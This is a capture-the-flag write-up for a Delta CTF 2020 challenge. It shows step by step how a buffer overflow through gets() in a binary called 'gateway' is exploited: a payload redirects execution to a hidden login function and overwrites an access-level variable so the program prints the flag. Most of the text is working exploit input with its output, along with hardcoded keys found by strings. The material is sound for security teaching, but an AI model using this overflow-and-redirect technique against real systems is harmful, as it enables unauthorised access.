# Delta CTF 2020: The Secret Society.


> Find and submit the {flag}
>
> (./file/gateway)

## Write-up

1. You are given an executable file called `gateway`. When we try running the executable, we get the output as follows.

```bash
$ ./gateway
What's your name? (max 63)
Name
Hello, Name, you are not one of us.
```

The binary promts for a name, and prints the name as output.

2. When we enter a long string as input, we observe a segmentation fault.

```bash
$ ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, you are not one of us.
Segmentation fault (core dumped)
```

This indicates that there might be a buffer overflow occurring.

3. We can confirm that by running `readelf`, which shows us the sections that are there in the executable.

```bash
$ readelf -s gateway
Symbol table '.dynsym' contains 10 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execl@GLIBC_2.2.5 (2)
     9: 0000000000404058     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)

Symbol table '.symtab' contains 70 entries:
    51: 00000000004011d6   288 FUNC    GLOBAL DEFAULT   15 login
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    54: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@@GLIBC_2.2.5
    56: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    57: 0000000000404050     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    58: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    60: 0000000000401360   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init
    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@@GLIBC_2.2.5
    62: 0000000000404068     0 NOTYPE  GLOBAL DEFAULT   26 _end
    63: 0000000000401120     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_static_pie
    64: 00000000004010f0    47 FUNC    GLOBAL DEFAULT   15 _start
    65: 0000000000404058     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    66: 00000000004012f6    94 FUNC    GLOBAL DEFAULT   15 main
    67: 0000000000404058     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    68: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND execl@@GLIBC_2.2.5
    69: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
```

We can see that it calls the function `gets`, which is a very vulnerable function to get input in C. Therefore, it is confirmed that a buffer overflow is occurring here.

4. By running `strings`, we can see the strings are present in the executable.

```bash
$ strings gateway
Codename (max 15): 
Access Key (max 31): 
novice
uQ3V7CUnmCSUQDDkAIPQVqAATh6rzxW
master
v7WETIEAoWSq0m6FDZyOWrf4ngfK3ku
flag.txt
/bin/cat
Welcome, %s.
Your access level is %d.
What's your name? (max 63)
Hello, %s, you are not one of us.
```

We see strings that did not appear when we ran the executable. We can also see from the output of `readelf` that there's a function other than `main`, called `login`, whose address is `4011d6`.

5. The maximum length that the name can be is given as 63, hence we can find the point of overflow by starting at 64 and incrementing the length of input by 2 and analyzing the output of `dmesg | tail` to see when the return address is overwritten.

```bash
$ python -c "print('A'*73)" | ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, you are not one of us.
Segmentation fault (core dumped)

$ dmesg | tail
[31057.511956] gateway[12245]: segfault at 7f34f6600041 ip 00007f34f6600041 sp 00007ffe60992e50 error 15 in libc-2.30.so[7f34f65e1000+25000]
```

We can see that at a length of 73, the last A has appeared at the last byte of the instruction pointer, with the hex value of `0x41`.

6. By giving the address of the `login` function in little endian as input, we can redirect the flow of execution.

```bash
$ python -c 'print("A"*72+"\xd6\x11\x40\x00\x00")' | ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, you are not one of us.
Codename (max 15): Access Key (max 31): Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAA�.
Your access level is 255.
Segmentation fault (core dumped)
```

7. When we enter a long string as input for the `login` function as well, we see that the access level displayed suddenly jumps to a large number.

```bash
$ python -c 'print("A"*72+"\xd6\x11\x40\x00\x00\n"+"B"*100)' | ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, you are not one of us.
Codename (max 15): Access Key (max 31): Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.
Your access level is 1111638594.
Segmentation fault (core dumped)
```

This indicates that there is a buffer overflow occurring here too, which causes the input to overflow and overwrite the local variable where the access level is stored.

8. Disassembling the executable using `objdump`, we get the following assembly code for the function `login`. Specifically observe the following lines.

```bash
$ objdump -d gateway
00000000004011d6 <login>:
  4011f5:       e8 a6 fe ff ff          callq  4010a0 <printf@plt>
  401206:       e8 b5 fe ff ff          callq  4010c0 <gets@plt>
  401217:       e8 84 fe ff ff          callq  4010a0 <printf@plt>
  401228:       e8 93 fe ff ff          callq  4010c0 <gets@plt>

  40123b:       e8 70 fe ff ff          callq  4010b0 <strcmp@plt>
  401252:       e8 59 fe ff ff          callq  4010b0 <strcmp@plt>
  401272:       e8 39 fe ff ff          callq  4010b0 <strcmp@plt>
  401289:       e8 22 fe ff ff          callq  4010b0 <strcmp@plt>

  401292:       c7 45 fc 50 00 00 00    movl   $0x50,-0x4(%rbp)
  401299:       83 7d fc 2f             cmpl   $0x2f,-0x4(%rbp)
  40129d:       7f 26                   jg     4012c5 <login+0xef>

  4012be:       e8 1d fe ff ff          callq  4010e0 <execl@plt>
  
  4012c5:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  4012d8:       e8 c3 fd ff ff          callq  4010a0 <printf@plt>
  4012dd:       8b 45 fc                mov    -0x4(%rbp),%eax
  4012ee:       e8 ad fd ff ff          callq  4010a0 <printf@plt>

  4012f4:       c9                      leaveq 
  4012f5:       c3                      retq   
```

We can see that the function performs a few string compares, but those are not of any consequence. The important operation is that in line `401299` it compares a value on the stack to the hex value `0x2f = 47`, and if it is greater the control jumps to instruction `4012c5`, which bypasses a call to `execl`. As this `execl` is most likely to be what outputs the flag, we need to overflow the stack value such that it is not greater than 47.

9. Passing input to the executable such that the level value is overwritten by the hex value of B, we start at 16 characters and increment the length of input by 2 until the level value gets overwritten.

```bash
$ python -c 'print("A"*72+"\xd6\x11\x40\x00\x00\n"+"B"*28)' | ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, you are not one of us.
cat: flag.txt: No such file or directory
```

Therefore, we fail the check and the `execl` call is executed, which tries to print the contents of a file called `flag.txt`.

10. When entering this input on the server, we get the output as follows.

```bash
$ python -c 'print("A"*72+"\xd6\x11\x40\x00\x00\n"+"B"*28)' | ./gateway
What's your name? (max 63)
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@, you are not one of us.
dctf{i_h4v3_pr0v3n_mys3lf_w0rthy}
```

Therefore, we find that the flag is dctf{i_h4v3_pr0v3n_mys3lf_w0rthy}.